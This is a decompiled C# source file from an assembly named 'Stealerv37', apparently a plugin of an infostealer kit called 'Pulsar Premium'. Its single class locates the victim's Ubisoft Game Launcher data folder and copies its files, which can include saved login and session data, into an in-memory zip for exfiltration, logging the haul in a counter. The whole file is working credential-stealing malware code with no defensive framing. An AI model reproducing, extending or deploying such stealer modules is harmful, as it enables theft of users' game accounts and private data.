// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Games.Uplay
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.IO;

#nullable disable
namespace Intelix.Targets.Games;

public class Uplay : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string str = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Ubisoft Game Launcher");
    if (!Directory.Exists(str))
      return;
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (Uplay);
    zip.AddDirectoryFiles(str, nameof (Uplay));
    counterApplications.Files.Add(str + " => \\Uplay");
    counterApplications.Files.Add("Uplay\\");
    counter.Games.Add(counterApplications);
  }
}
